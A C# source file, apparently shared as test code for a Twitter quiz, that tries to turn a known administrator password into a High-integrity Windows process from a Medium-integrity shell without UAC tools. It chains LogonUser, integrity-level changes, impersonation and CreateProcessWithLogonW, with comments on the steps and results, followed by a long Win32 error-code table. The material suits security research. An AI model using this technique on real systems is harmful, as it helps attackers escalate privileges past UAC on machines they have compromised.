

// 
// "Ctrl+M, O is your friend"
// Welcome to use any code or declares. Would appriciate it if referenced it back here: https://github.com/AltF5?tab=repositories
//
// Uploaded for Antonio Cocomazzi (@splinter_code)
// https://twitter.com/splinter_code/status/1458054161472307204
//
// 
// Problem experiencing:    Not a High IL token after CreateProcessWithLogonW (CPWLW)..
// Tested as: Calling from Medium IL user not belonging to BUILTIN\Administrators group.
//            See full test notes below in method:  RunApp_UseAnotherAccountAdminPW_TestCode()

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

public class TestCode
{
    /// <summary>
    /// Antonio Cocomazzi @splinter_code solution to his Quiz in Nov 2021 - created by winlogon0 to test it
    /// </summary>
    /// <param name="fullCmdLine">Commandline / Application to execute</param>
    /// <param name="adminAccountName">An account belonging to BUILTIN\Administrators</param>
    /// <param name="pwToAdminAccount">Password for THAT admin account</param>
    /// <param name="logonType">LogonType to perform</param>
    /// <param name="closeProcessHandlesBeforeReturn">Should the created process handles be left open for the caller to close?</param>
    /// <returns>Information about the created process, or a reason why not</returns>
    public static ProcessCreateStatus RunApp_UseAnotherAccountAdminPW_TestCode(
        string fullCmdLine,
        string adminAccountName, string pwToAdminAccount,
        LogonType logonType = LogonType.Network,
        bool closeProcessHandlesBeforeReturn = true)
    {
        ProcessCreateStatus ret = new ProcessCreateStatus();

        //  -- QUIZ --
        //  You landed on a machine and you have a shell as normal user(Medium IL).You know the password of one administrator of that machine, how you get a process as High IL?
        //    Contraint: Network stack not available No entry
        //    Bonus level: UACMe usage not allowed Smiling face with horns
        //    https://twitter.com/splinter_code/status/1457589164002643971
        //

        // -- Solution --
        //      LogonUser (Network)
        //      -> Set token IL to Medium
        //      -> Set Everyone FullControl on your current process DACL
        //      -> Impersonate
        //      -> CreateProcessWithLogon (LOGON_NETCREDENTIALS_ONLY) and specify the admin credentials.
        //      Enjoy High IL process with Interactive SID 

        // -- Call via --
        //      Execute this code from an account NOT belonging to BUILTI\Administrators group (compmgmt.msc)
        //      RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe", "AdminAcct", "itsPW");

        // -- Result --
        //      This creates a process as the other another user with the BUILTIN\Administrators group
        //      HOWEVER, Mandatory Label\Medium Mandatory Level 
        //
        // whoami
        // whoami /groups
        // whoami /priv
        //

        // -- Noticed --
        // Available privileges in token despite medium IL (IF MANUALLY ADDED via secpol.msc)
        //      If the Admin-group containing user is directly (or indirectly via group membership) manually added to LSA User Right Privileges, then the following Privileges will 
        //      PERSIST, and ARE enableable via ProcessHacker, despite these should never belong in a Medium IL token
        //      [Notice no SeDebug, SeImpersonate, or SeTcb]
        //       All of these are enable-able as well (via ProcessHacker), despite only 2 being enabled by default: SeChangeNotify, SeCreateGlobal
        //
        //      SeAssignPrimaryTokenPrivilege                   <== Interested. Only SYSTEM usually has this, and needed for CreateProcessAsUser call
        //      SeLockMemoryPrivilege
        //      SeIncreaseQuotaPrivilege
        //      SeMachineAccountPrivilege
        //      SeSecurityPrivilege
        //      SeSystemProfilePrivilege
        //      SeSystemtimePrivilege
        //      SeProfileSingleProcessPrivilege
        //      SeIncreaseBasePriorityPrivilege
        //      SeCreatePagefilePrivilege
        //      SeCreatePermanentPrivilege
        //      SeShutdownPrivilege
        //      SeAuditPrivilege
        //      SeSystemEnvironmentPrivilege
        //      SeChangeNotifyPrivilege
        //      SeRemoteShutdownPrivilege
        //      SeUndockPrivilege
        //      SeSyncAgentPrivilege
        //      SeEnableDelegationPrivilege
        //      SeManageVolumePrivilege
        //      SeCreateGlobalPrivilege
        //      SeTrustedCredManAccessPrivilege
        //      SeIncreaseWorkingSetPrivilege
        //      SeTimeZonePrivilege
        //      SeCreateSymbolicLinkPrivilege


        // To fix (but appears unaffected): GrantEveryoneAccessToProcess not working (Access Denied) when a Medium IL Caller (not in Administrator group)
        //          However doing it doesn't help, as attempted this PH
        //

        SplitUserAndDomain(adminAccountName, out bool justUserSupplied, out string userOnly, out string domainIfSupplied);
        if (justUserSupplied)
        {
            domainIfSupplied = null;
        }

        IntPtr hTokenOutput;
        bool did = LogonUserA(userOnly, domainIfSupplied, pwToAdminAccount, (int)logonType, (int)LogonProvider_LogonUser.LOGON32_PROVIDER_DEFAULT, out hTokenOutput);
        if (!did)
        {
            ret.Success = false;
            ret.ErrorText = "LogonUser call failed: " + GetLastErrorInfo();
        }
        else if (hTokenOutput == IntPtr.Zero)
        {
            ret.Success = false;
            ret.ErrorText = "LogonUser was successful, but the token returned was NULL!";
        }
        else
        {
            bool didSetIL = SetTokenIntegrityLevel(hTokenOutput, IntegrityLevel.Medium);

            // NOT currently working -- Set a BP before here and do via PH manually         // <=========== temp manual step
            // However it doesn't help the issue

            //bool didDeleteDACL = GrantEveryoneAccessToProcess(GetCurrentProcessId(), true);
            //bool didGrantEveryone = GrantEveryoneAccessToProcess(GetCurrentProcessId(), false);

            bool didImpersonate = ImpersonateLoggedOnUser(hTokenOutput);                    // <=========== TBD -- Doesn't seem to matter whether we do this or not

            PROCESS_INFORMATION pi;
            STARTUPINFO_W si = new STARTUPINFO_W();
            si.cb = Marshal.SizeOf(si);

            StopWow64Redirection(true);

            const int LOGON_WITH_PROFILE = 1;                   // <=========================== CHANGE FROM ORIGINAL TECHNIQUE
            const int LOGON_NETCREDENTIALS_ONLY = 2;            // ERROR_INVALID_LOGON_TYPE

            bool didCreate = CreateProcessWithLogonW(userOnly, domainIfSupplied, pwToAdminAccount, LOGON_WITH_PROFILE,
                null, fullCmdLine,
                (uint)CreationFlags.CREATE_NEW_CONSOLE | (uint)CreationFlags.CREATE_UNICODE_ENVIRONMENT,
                IntPtr.Zero, null,
                ref si,
                out pi);

            if (!didCreate)
            {
                ret.Success = false;
                ret.ErrorText = "CPWLW failed: " + GetLastErrorInfo();
            }
            else
            {
                ret.Success = true;
                ret.ProcessInfo = pi;

                // Autoclose?
                if (closeProcessHandlesBeforeReturn)
                {
                    if (ret.ProcessInfo.hProcess != IntPtr.Zero)
                    {
                        CloseHandle(ret.ProcessInfo.hProcess);
                        ret.ProcessInfo.hProcess = IntPtr.Zero;
                    }

                    if (ret.ProcessInfo.hThread != IntPtr.Zero)
                    {
                        CloseHandle(ret.ProcessInfo.hThread);
                        ret.ProcessInfo.hThread = IntPtr.Zero;
                    }
                }
            }

            StopWow64Redirection(false);

            if (didImpersonate)
            {
                RevertToSelf();
            }
        }

        return ret;
    }


    #region String Splitting Helper Methods

    /// <summary>
    /// Splits out the Username and Domain from Domain\User OR UPN Format: Test@Domain
    /// If "." or "" is supplied for the domain, then the computername is returned. If no domain is supplied, then no domain is returned (will not assume the computer name)
    /// </summary>
    /// <param name="userOrDomainAndUser">Input: Domain\User or just User</param>
    /// <param name="justUserSupplied">Output:   Was just the username passed in</param>
    /// <param name="userOnly">Output:   User</param>
    /// <param name="domainIfSupplied">Output: The domain supplied, or the translation to the computer name (Environment.MachineName) if "."\User or ""\User</param>
    public static void SplitUserAndDomain(string userOrDomainAndUser, out bool wasJustUserSupplied, out string userOnly, out string domainIfSupplied)
    {
        //
        // Example call:
        //      string userOnly = user_OrUserAndDomain;
        //      string domainIfSupplied = "";
        //      bool justUserSupplied;
        //      SplitUserAndDomain(user_OrUserAndDomain, out justUserSupplied, out userOnly, out domainIfSupplied);
        //
        //      if (!wasJustUserSupplied)
        //      {
        //          user_OrDomainAndUser = domainIfSupplied + "\\" + userOnly;      // Reassemble
        //      }

        userOnly = userOrDomainAndUser;
        domainIfSupplied = "";
        wasJustUserSupplied = !userOrDomainAndUser.Contains("\\") && !userOrDomainAndUser.Contains("@");

        if (wasJustUserSupplied)
        {
            // userOnly will be accurate
        }
        else
        {
            if (userOrDomainAndUser.Contains("\\"))
            {
                //
                // Typical case:
                //

                // If the domain was supplied then split out the Domain \ User from the input
                string[] split = userOrDomainAndUser.Split('\\');

                if (split.Length == 1)
                {
                    userOnly = split[0].Trim();
                }
                else if (split.Length >= 2)
                {
                    domainIfSupplied = split[0].Trim();
                    userOnly = split[1].Trim();

                    // Allow "." as input to refer to the current computer (for local accounts)
                    if (string.IsNullOrWhiteSpace(domainIfSupplied) || domainIfSupplied.Trim() == ".")
                    {
                        domainIfSupplied = Environment.MachineName;
                    }
                }
            }
            else if (userOrDomainAndUser.Contains("@"))
            {
                //
                // UPN Case:
                //

                string[] split = userOrDomainAndUser.Split('@');
                if (split.Length == 1)
                {
                    userOnly = split[0].Trim();
                }
                else if (split.Length >= 2)
                {
                    domainIfSupplied = split[1].Trim();         // Domain is 2nd instead of first
                    userOnly = split[0].Trim();
                }
            }

        }
    }

    public static void SplitWindowStationAndDesktop(string windowStationAndDesktop, out string wsName, out string desktopName)
    {
        wsName = "WinSta0";
        desktopName = "Default";

        string[] tokens = windowStationAndDesktop.Split('\\');
        if (tokens.Length == 1)
        {
            desktopName = tokens[0];
        }
        else if (tokens.Length >= 2)
        {
            wsName = tokens[0];
            desktopName = tokens[1];
        }

        if (string.IsNullOrWhiteSpace(desktopName))
        {
            desktopName = "Default";        // Default back to "Default"
        }
    }

    #endregion

    #region Error Code Help

    public static void Status(string msg)
    {
        Debug.WriteLine(msg);

        // ...Do anything else needed...
    }
    public static void Status(string msg, string moreInfo1 = "", string moreInfo2 = "")
    {
        Status(msg + ".  " + moreInfo1 + ".  " + moreInfo2);
    }

    /// <summary>
    /// Same as GetErrorInfo, but does the Marshal.GetLastWin32Error() for us
    /// Note: for Marshal.GetLastWin32Error() to work, you must have set SetLastError = True in the DllImport attribute tag for every API call whos
    /// documentation mentions use GetLastError() to get error info
    /// </summary>
    /// <returns></returns>
    public static string GetLastErrorInfo()
    {
        int err = Marshal.GetLastWin32Error();
        return GetErrorInfo(err);
    }

    /// <summary>
    /// Displays the error code in Hex, Decimal, and the message
    /// </summary>
    /// <returns>Info regarding the error</returns>
    public static string GetErrorInfo(int win32ErrorCode)
    {
        return string.Format("Error: {0}, 0x{0:X}: {1}: {2}", win32ErrorCode, GetErrorVariableNameWin32(win32ErrorCode), new Win32Exception(win32ErrorCode).Message);

        // Internal information: How Win32Exception gets its information - It calls FormatMessage
        //      referencesource.microsoft.com/#System/compmod/system/componentmodel/Win32Exception.cs,d37f64a3800f4771
        //      which calls TryGetErrorMessage
    }

    /// <summary>
    /// Translates an error code to the variable name of the Win32 Error
    /// </summary>
    public static string GetErrorVariableNameWin32(int win32ErrorCode)
    {
        // This is a class with 'public const'  (static)

        FieldInfo[] fields = typeof(Win32Error).GetFields();
        foreach (FieldInfo fi in fields)
            if ((int)fi.GetValue(null) == win32ErrorCode)
                return fi.Name;
        return String.Empty;


        // For an enum:
        //return Enum.GetName(typeof(Win32Error), errCode);
    }

    #region Win32Error (shortened)

    // Not included: ResultCom (not included)
    //
    // From: http://www.pinvoke.net/default.aspx/Constants/WINERROR.html
    //       https://www.pinvoke.net/default.aspx/Constants.WINERROR
    //
    // MS Documentation: 
    //      https://docs.microsoft.com/en-us/windows/desktop/debug/system-error-codes--1700-3999
    //
    // Shortened version. Excluded lesser-used ones
    //      Stopped at ERROR_CTX_WINSTATION_NAME_INVALID = 7001
    public class Win32Error
    {
        /// <summary>
        /// (No error set)
        /// </summary>
        public const int Error_NoError = -2;

        /// <summary>
        /// (An unspecified error occurred -- For errors that cannot be mapped to other messages)
        /// </summary>
        public const int Error_Unspecified = -1;

        /// <summary>
        /// The operation completed successfully.
        /// </summary>
        public const int ERROR_SUCCESS = 0;
        /// <summary>
        /// Incorrect function.
        /// </summary>
        public const int ERROR_INVALID_FUNCTION = 1;
        /// <summary>
        /// The system cannot find the file specified.
        /// </summary>
        public const int ERROR_FILE_NOT_FOUND = 2;
        /// <summary>
        /// The system cannot find the path specified.
        /// </summary>
        public const int ERROR_PATH_NOT_FOUND = 3;
        /// <summary>
        /// The system cannot open the file.
        /// </summary>
        public const int ERROR_TOO_MANY_OPEN_FILES = 4;
        /// <summary>
        /// Access is denied.
        /// </summary>
        public const int ERROR_ACCESS_DENIED = 5;
        /// <summary>
        /// The handle is invalid.
        /// </summary>
        public const int ERROR_INVALID_HANDLE = 6;
        /// <summary>
        /// The storage control blocks were destroyed.
        /// </summary>
        public const int ERROR_ARENA_TRASHED = 7;
        /// <summary>
        /// Not enough storage is available to process this command.
        /// </summary>
        public const int ERROR_NOT_ENOUGH_MEMORY = 8;
        /// <summary>
        /// The storage control block address is invalid.
        /// </summary>
        public const int ERROR_INVALID_BLOCK = 9;
        /// <summary>
        /// The environment is incorrect.
        /// </summary>
        public const int ERROR_BAD_ENVIRONMENT = 10;
        /// <summary>
        /// An attempt was made to load a program with an incorrect format.
        /// </summary>
        public const int ERROR_BAD_FORMAT = 11;
        /// <summary>
        /// The access code is invalid.
        /// </summary>
        public const int ERROR_INVALID_ACCESS = 12;
        /// <summary>
        /// The data is invalid.
        /// </summary>
        public const int ERROR_INVALID_DATA = 13;
        /// <summary>
        /// Not enough storage is available to complete this operation.
        /// </summary>
        public const int ERROR_OUTOFMEMORY = 14;
        /// <summary>
        /// The system cannot find the drive specified.
        /// </summary>
        public const int ERROR_INVALID_DRIVE = 15;
        /// <summary>
        /// The directory cannot be removed.
        /// </summary>
        public const int ERROR_CURRENT_DIRECTORY = 16;
        /// <summary>
        /// The system cannot move the file to a different disk drive.
        /// </summary>
        public const int ERROR_NOT_SAME_DEVICE = 17;
        /// <summary>
        /// There are no more files.
        /// </summary>
        public const int ERROR_NO_MORE_FILES = 18;
        /// <summary>
        /// The media is write protected.
        /// </summary>
        public const int ERROR_WRITE_PROTECT = 19;
        /// <summary>
        /// The system cannot find the device specified.
        /// </summary>
        public const int ERROR_BAD_UNIT = 20;
        /// <summary>
        /// The device is not ready.
        /// </summary>
        public const int ERROR_NOT_READY = 21;
        /// <summary>
        /// The device does not recognize the command.
        /// </summary>
        public const int ERROR_BAD_COMMAND = 22;
        /// <summary>
        /// Data error (cyclic redundancy check).
        /// </summary>
        public const int ERROR_CRC = 23;
        /// <summary>
        /// The program issued a command but the command length is incorrect.
        /// </summary>
        public const int ERROR_BAD_LENGTH = 24;
        /// <summary>
        /// The drive cannot locate a specific area or track on the disk.
        /// </summary>
        public const int ERROR_SEEK = 25;
        /// <summary>
        /// The specified disk or diskette cannot be accessed.
        /// </summary>
        public const int ERROR_NOT_DOS_DISK = 26;
        /// <summary>
        /// The drive cannot find the sector requested.
        /// </summary>
        public const int ERROR_SECTOR_NOT_FOUND = 27;
        /// <summary>
        /// The printer is out of paper.
        /// </summary>
        public const int ERROR_OUT_OF_PAPER = 28;
        /// <summary>
        /// The system cannot write to the specified device.
        /// </summary>
        public const int ERROR_WRITE_FAULT = 29;
        /// <summary>
        /// The system cannot read from the specified device.
        /// </summary>
        public const int ERROR_READ_FAULT = 30;
        /// <summary>
        /// A device attached to the system is not functioning.
        /// </summary>
        public const int ERROR_GEN_FAILURE = 31;
        /// <summary>
        /// The process cannot access the file because it is being used by another process.
        /// </summary>
        public const int ERROR_SHARING_VIOLATION = 32;
        /// <summary>
        /// The process cannot access the file because another process has locked a portion of the file.
        /// </summary>
        public const int ERROR_LOCK_VIOLATION = 33;
        /// <summary>
        /// The wrong diskette is in the drive.
        /// Insert %2 (Volume Serial Number: %3) into drive %1.
        /// </summary>
        public const int ERROR_WRONG_DISK = 34;
        /// <summary>
        /// Too many files opened for sharing.
        /// </summary>
        public const int ERROR_SHARING_BUFFER_EXCEEDED = 36;
        /// <summary>
        /// Reached the end of the file.
        /// </summary>
        public const int ERROR_HANDLE_EOF = 38;
        /// <summary>
        /// The disk is full.
        /// </summary>
        public const int ERROR_HANDLE_DISK_FULL = 39;
        /// <summary>
        /// The request is not supported.
        /// </summary>
        public const int ERROR_NOT_SUPPORTED = 50;
        /// <summary>
        /// Windows cannot find the network path. Verify that the network path is correct and the destination computer is not busy or turned off. If Windows still cannot find the network path, contact your network administrator.
        /// </summary>
        public const int ERROR_REM_NOT_LIST = 51;
        /// <summary>
        /// You were not connected because a duplicate name exists on the network. Go to System in Control Panel to change the computer name and try again.
        /// </summary>
        public const int ERROR_DUP_NAME = 52;
        /// <summary>
        /// The network path was not found.
        /// </summary>
        public const int ERROR_BAD_NETPATH = 53;
        /// <summary>
        /// The network is busy.
        /// </summary>
        public const int ERROR_NETWORK_BUSY = 54;
        /// <summary>
        /// The specified network resource or device is no longer available.
        /// </summary>
        public const int ERROR_DEV_NOT_EXIST = 55;
        /// <summary>
        /// The network BIOS command limit has been reached.
        /// </summary>
        public const int ERROR_TOO_MANY_CMDS = 56;
        /// <summary>
        /// A network adapter hardware error occurred.
        /// </summary>
        public const int ERROR_ADAP_HDW_ERR = 57;
        /// <summary>
        /// The specified server cannot perform the requested operation.
        /// </summary>
        public const int ERROR_BAD_NET_RESP = 58;
        /// <summary>
        /// An unexpected network error occurred.
        /// </summary>
        public const int ERROR_UNEXP_NET_ERR = 59;
        /// <summary>
        /// The remote adapter is not compatible.
        /// </summary>
        public const int ERROR_BAD_REM_ADAP = 60;
        /// <summary>
        /// The printer queue is full.
        /// </summary>
        public const int ERROR_PRINTQ_FULL = 61;
        /// <summary>
        /// Space to store the file waiting to be printed is not available on the server.
        /// </summary>
        public const int ERROR_NO_SPOOL_SPACE = 62;
        /// <summary>
        /// Your file waiting to be printed was deleted.
        /// </summary>
        public const int ERROR_PRINT_CANCELLED = 63;
        /// <summary>
        /// The specified network name is no longer available.
        /// </summary>
        public const int ERROR_NETNAME_DELETED = 64;
        /// <summary>
        /// Network access is denied.
        /// </summary>
        public const int ERROR_NETWORK_ACCESS_DENIED = 65;
        /// <summary>
        /// The network resource type is not correct.
        /// </summary>
        public const int ERROR_BAD_DEV_TYPE = 66;
        /// <summary>
        /// The network name cannot be found.
        /// </summary>
        public const int ERROR_BAD_NET_NAME = 67;
        /// <summary>
        /// The name limit for the local computer network adapter card was exceeded.
        /// </summary>
        public const int ERROR_TOO_MANY_NAMES = 68;
        /// <summary>
        /// The network BIOS session limit was exceeded.
        /// </summary>
        public const int ERROR_TOO_MANY_SESS = 69;
        /// <summary>
        /// The remote server has been paused or is in the process of being started.
        /// </summary>
        public const int ERROR_SHARING_PAUSED = 70;
        /// <summary>
        /// No more connections can be made to this remote computer at this time because there are already as many connections as the computer can accept.
        /// </summary>
        public const int ERROR_REQ_NOT_ACCEP = 71;
        /// <summary>
        /// The specified printer or disk device has been paused.
        /// </summary>
        public const int ERROR_REDIR_PAUSED = 72;
        /// <summary>
        /// The file exists.
        /// </summary>
        public const int ERROR_FILE_EXISTS = 80;
        /// <summary>
        /// The directory or file cannot be created.
        /// </summary>
        public const int ERROR_CANNOT_MAKE = 82;
        /// <summary>
        /// Fail on INT 24.
        /// </summary>
        public const int ERROR_FAIL_I24 = 83;
        /// <summary>
        /// Storage to process this request is not available.
        /// </summary>
        public const int ERROR_OUT_OF_STRUCTURES = 84;
        /// <summary>
        /// The local device name is already in use.
        /// </summary>
        public const int ERROR_ALREADY_ASSIGNED = 85;
        /// <summary>
        /// The specified network password is not correct.
        /// </summary>
        public const int ERROR_INVALID_PASSWORD = 86;
        /// <summary>
        /// The parameter is incorrect.
        /// </summary>
        public const int ERROR_INVALID_PARAMETER = 87;
        /// <summary>
        /// A write fault occurred on the network.
        /// </summary>
        public const int ERROR_NET_WRITE_FAULT = 88;
        /// <summary>
        /// The system cannot start another process at this time.
        /// </summary>
        public const int ERROR_NO_PROC_SLOTS = 89;
        /// <summary>
        /// Cannot create another system semaphore.
        /// </summary>
        public const int ERROR_TOO_MANY_SEMAPHORES = 100;
        /// <summary>
        /// The exclusive semaphore is owned by another process.
        /// </summary>
        public const int ERROR_EXCL_SEM_ALREADY_OWNED = 101;
        /// <summary>
        /// The semaphore is set and cannot be closed.
        /// </summary>
        public const int ERROR_SEM_IS_SET = 102;
        /// <summary>
        /// The semaphore cannot be set again.
        /// </summary>
        public const int ERROR_TOO_MANY_SEM_REQUESTS = 103;
        /// <summary>
        /// Cannot request exclusive semaphores at interrupt time.
        /// </summary>
        public const int ERROR_INVALID_AT_INTERRUPT_TIME = 104;
        /// <summary>
        /// The previous ownership of this semaphore has ended.
        /// </summary>
        public const int ERROR_SEM_OWNER_DIED = 105;
        /// <summary>
        /// Insert the diskette for drive %1.
        /// </summary>
        public const int ERROR_SEM_USER_LIMIT = 106;
        /// <summary>
        /// The program stopped because an alternate diskette was not inserted.
        /// </summary>
        public const int ERROR_DISK_CHANGE = 107;
        /// <summary>
        /// The disk is in use or locked by another process.
        /// </summary>
        public const int ERROR_DRIVE_LOCKED = 108;
        /// <summary>
        /// The pipe has been ended.
        /// </summary>
        public const int ERROR_BROKEN_PIPE = 109;
        /// <summary>
        /// The system cannot open the device or file specified.
        /// </summary>
        public const int ERROR_OPEN_FAILED = 110;
        /// <summary>
        /// The file name is too long.
        /// </summary>
        public const int ERROR_BUFFER_OVERFLOW = 111;
        /// <summary>
        /// There is not enough space on the disk.
        /// </summary>
        public const int ERROR_DISK_FULL = 112;
        /// <summary>
        /// No more internal file identifiers available.
        /// </summary>
        public const int ERROR_NO_MORE_SEARCH_HANDLES = 113;
        /// <summary>
        /// The target internal file identifier is incorrect.
        /// </summary>
        public const int ERROR_INVALID_TARGET_HANDLE = 114;
        /// <summary>
        /// The IOCTL call made by the application program is not correct.
        /// </summary>
        public const int ERROR_INVALID_CATEGORY = 117;
        /// <summary>
        /// The verify-on-write switch parameter value is not correct.
        /// </summary>
        public const int ERROR_INVALID_VERIFY_SWITCH = 118;
        /// <summary>
        /// The system does not support the command requested.
        /// </summary>
        public const int ERROR_BAD_DRIVER_LEVEL = 119;
        /// <summary>
        /// This function is not supported on this system.
        /// </summary>
        public const int ERROR_CALL_NOT_IMPLEMENTED = 120;
        /// <summary>
        /// The semaphore timeout period has expired.
        /// </summary>
        public const int ERROR_SEM_TIMEOUT = 121;
        /// <summary>
        /// The data area passed to a system call is too small.
        /// </summary>
        public const int ERROR_INSUFFICIENT_BUFFER = 122;
        /// <summary>
        /// The filename, directory name, or volume label syntax is incorrect.
        /// </summary>
        public const int ERROR_INVALID_NAME = 123;
        /// <summary>
        /// The system call level is not correct.
        /// </summary>
        public const int ERROR_INVALID_LEVEL = 124;
        /// <summary>
        /// The disk has no volume label.
        /// </summary>
        public const int ERROR_NO_VOLUME_LABEL = 125;
        /// <summary>
        /// The specified module could not be found.
        /// </summary>
        public const int ERROR_MOD_NOT_FOUND = 126;
        /// <summary>
        /// The specified procedure could not be found.
        /// </summary>
        public const int ERROR_PROC_NOT_FOUND = 127;
        /// <summary>
        /// There are no child processes to wait for.
        /// </summary>
        public const int ERROR_WAIT_NO_CHILDREN = 128;
        /// <summary>
        /// The %1 application cannot be run in Win32 mode.
        /// </summary>
        public const int ERROR_CHILD_NOT_COMPLETE = 129;
        /// <summary>
        /// Attempt to use a file handle to an open disk partition for an operation other than raw disk I/O.
        /// </summary>
        public const int ERROR_DIRECT_ACCESS_HANDLE = 130;
        /// <summary>
        /// An attempt was made to move the file pointer before the beginning of the file.
        /// </summary>
        public const int ERROR_NEGATIVE_SEEK = 131;
        /// <summary>
        /// The file pointer cannot be set on the specified device or file.
        /// </summary>
        public const int ERROR_SEEK_ON_DEVICE = 132;
        /// <summary>
        /// A JOIN or SUBST command cannot be used for a drive that contains previously joined drives.
        /// </summary>
        public const int ERROR_IS_JOIN_TARGET = 133;
        /// <summary>
        /// An attempt was made to use a JOIN or SUBST command on a drive that has already been joined.
        /// </summary>
        public const int ERROR_IS_JOINED = 134;
        /// <summary>
        /// An attempt was made to use a JOIN or SUBST command on a drive that has already been substituted.
        /// </summary>
        public const int ERROR_IS_SUBSTED = 135;
        /// <summary>
        /// The system tried to delete the JOIN of a drive that is not joined.
        /// </summary>
        public const int ERROR_NOT_JOINED = 136;
        /// <summary>
        /// The system tried to delete the substitution of a drive that is not substituted.
        /// </summary>
        public const int ERROR_NOT_SUBSTED = 137;
        /// <summary>
        /// The system tried to join a drive to a directory on a joined drive.
        /// </summary>
        public const int ERROR_JOIN_TO_JOIN = 138;
        /// <summary>
        /// The system tried to substitute a drive to a directory on a substituted drive.
        /// </summary>
        public const int ERROR_SUBST_TO_SUBST = 139;
        /// <summary>
        /// The system tried to join a drive to a directory on a substituted drive.
        /// </summary>
        public const int ERROR_JOIN_TO_SUBST = 140;
        /// <summary>
        /// The system tried to SUBST a drive to a directory on a joined drive.
        /// </summary>
        public const int ERROR_SUBST_TO_JOIN = 141;
        /// <summary>
        /// The system cannot perform a JOIN or SUBST at this time.
        /// </summary>
        public const int ERROR_BUSY_DRIVE = 142;
        /// <summary>
        /// The system cannot join or substitute a drive to or for a directory on the same drive.
        /// </summary>
        public const int ERROR_SAME_DRIVE = 143;
        /// <summary>
        /// The directory is not a subdirectory of the root directory.
        /// </summary>
        public const int ERROR_DIR_NOT_ROOT = 144;
        /// <summary>
        /// The directory is not empty.
        /// </summary>
        public const int ERROR_DIR_NOT_EMPTY = 145;
        /// <summary>
        /// The path specified is being used in a substitute.
        /// </summary>
        public const int ERROR_IS_SUBST_PATH = 146;
        /// <summary>
        /// Not enough resources are available to process this command.
        /// </summary>
        public const int ERROR_IS_JOIN_PATH = 147;
        /// <summary>
        /// The path specified cannot be used at this time.
        /// </summary>
        public const int ERROR_PATH_BUSY = 148;
        /// <summary>
        /// An attempt was made to join or substitute a drive for which a directory on the drive is the target of a previous substitute.
        /// </summary>
        public const int ERROR_IS_SUBST_TARGET = 149;
        /// <summary>
        /// System trace information was not specified in your CONFIG.SYS file, or tracing is disallowed.
        /// </summary>
        public const int ERROR_SYSTEM_TRACE = 150;
        /// <summary>
        /// The number of specified semaphore events for DosMuxSemWait is not correct.
        /// </summary>
        public const int ERROR_INVALID_EVENT_COUNT = 151;
        /// <summary>
        /// DosMuxSemWait did not execute; too many semaphores are already set.
        /// </summary>
        public const int ERROR_TOO_MANY_MUXWAITERS = 152;
        /// <summary>
        /// The DosMuxSemWait list is not correct.
        /// </summary>
        public const int ERROR_INVALID_LIST_FORMAT = 153;
        /// <summary>
        /// The volume label you entered exceeds the label character limit of the target file system.
        /// </summary>
        public const int ERROR_LABEL_TOO_Int32 = 154;
        /// <summary>
        /// Cannot create another thread.
        /// </summary>
        public const int ERROR_TOO_MANY_TCBS = 155;
        /// <summary>
        /// The recipient process has refused the signal.
        /// </summary>
        public const int ERROR_SIGNAL_REFUSED = 156;
        /// <summary>
        /// The segment is already discarded and cannot be locked.
        /// </summary>
        public const int ERROR_DISCARDED = 157;
        /// <summary>
        /// The segment is already unlocked.
        /// </summary>
        public const int ERROR_NOT_LOCKED = 158;
        /// <summary>
        /// The address for the thread ID is not correct.
        /// </summary>
        public const int ERROR_BAD_THREADID_ADDR = 159;
        /// <summary>
        /// One or more arguments are not correct.
        /// </summary>
        public const int ERROR_BAD_ARGUMENTS = 160;
        /// <summary>
        /// The specified path is invalid.
        /// </summary>
        public const int ERROR_BAD_PATHNAME = 161;
        /// <summary>
        /// A signal is already pending.
        /// </summary>
        public const int ERROR_SIGNAL_PENDING = 162;
        /// <summary>
        /// No more threads can be created in the system.
        /// </summary>
        public const int ERROR_MAX_THRDS_REACHED = 164;
        /// <summary>
        /// Unable to lock a region of a file.
        /// </summary>
        public const int ERROR_LOCK_FAILED = 167;
        /// <summary>
        /// The requested resource is in use.
        /// </summary>
        public const int ERROR_BUSY = 170;
        /// <summary>
        /// A lock request was not outstanding for the supplied cancel region.
        /// </summary>
        public const int ERROR_CANCEL_VIOLATION = 173;
        /// <summary>
        /// The file system does not support atomic changes to the lock type.
        /// </summary>
        public const int ERROR_ATOMIC_LOCKS_NOT_SUPPORTED = 174;
        /// <summary>
        /// The system detected a segment number that was not correct.
        /// </summary>
        public const int ERROR_INVALID_SEGMENT_NUMBER = 180;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_INVALID_ORDINAL = 182;
        /// <summary>
        /// Cannot create a file when that file already exists.
        /// </summary>
        public const int ERROR_ALREADY_EXISTS = 183;
        /// <summary>
        /// The flag passed is not correct.
        /// </summary>
        public const int ERROR_INVALID_FLAG_NUMBER = 186;
        /// <summary>
        /// The specified system semaphore name was not found.
        /// </summary>
        public const int ERROR_SEM_NOT_FOUND = 187;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_INVALID_STARTING_CODESEG = 188;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_INVALID_STACKSEG = 189;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_INVALID_MODULETYPE = 190;
        /// <summary>
        /// Cannot run %1 in Win32 mode.
        /// </summary>
        public const int ERROR_INVALID_EXE_SIGNATURE = 191;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_EXE_MARKED_INVALID = 192;
        /// <summary>
        /// %1 is not a valid Win32 application.
        /// </summary>
        public const int ERROR_BAD_EXE_FORMAT = 193;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_ITERATED_DATA_EXCEEDS_64k = 194;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_INVALID_MINALLOCSIZE = 195;
        /// <summary>
        /// The operating system cannot run this application program.
        /// </summary>
        public const int ERROR_DYNLINK_FROM_INVALID_RING = 196;
        /// <summary>
        /// The operating system is not presently configured to run this application.
        /// </summary>
        public const int ERROR_IOPL_NOT_ENABLED = 197;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_INVALID_SEGDPL = 198;
        /// <summary>
        /// The operating system cannot run this application program.
        /// </summary>
        public const int ERROR_AUTODATASEG_EXCEEDS_64k = 199;
        /// <summary>
        /// The code segment cannot be greater than or equal to 64K.
        /// </summary>
        public const int ERROR_RING2SEG_MUST_BE_MOVABLE = 200;
        /// <summary>
